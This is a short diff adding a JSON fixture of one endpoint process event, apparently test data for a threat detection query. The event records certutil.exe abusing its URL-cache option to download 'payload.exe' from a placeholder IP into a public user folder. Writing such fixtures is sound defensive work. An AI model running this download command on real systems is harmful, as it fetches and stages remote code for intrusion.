@@ -1,0 +1,4 @@
+{"DeviceProcessEvents": [
+  {"FolderPath":"C:\\Windows\\System32\\certutil.exe",
+   "ProcessCommandLine":"certutil.exe -urlcache -split -f http://203.0.113.10/payload.exe C:\\Users\\Public\\p.exe"}
+]}
